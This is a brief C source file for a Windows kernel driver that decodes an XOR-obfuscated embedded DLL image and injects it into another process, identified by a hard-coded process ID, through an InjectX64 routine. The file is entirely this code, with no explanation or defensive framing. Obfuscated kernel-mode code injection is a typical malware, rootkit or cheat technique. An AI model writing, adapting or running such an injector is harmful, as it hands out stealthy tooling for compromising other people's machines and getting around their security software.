#include <ntifs.h>
#include "inject\Inject.h"
#include "dll.h"

VOID DriverUnload(PDRIVER_OBJECT pDriver)
{

}

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg)
{
	SIZE_T dwImageSize = sizeof(sysData);
	unsigned char * pMemory = (unsigned char *)ExAllocatePool(PagedPool,dwImageSize);
	memcpy(pMemory, sysData, dwImageSize);

	for (ULONG i = 0; i < dwImageSize; i++)
	{
		pMemory[i] ^= 0xd8;
		pMemory[i] ^= 0xcd;
	}
	
	InjectX64(15292, pMemory, dwImageSize);
	ExFreePool(pMemory);
	pDriver->DriverUnload = DriverUnload;
	return STATUS_SUCCESS;
}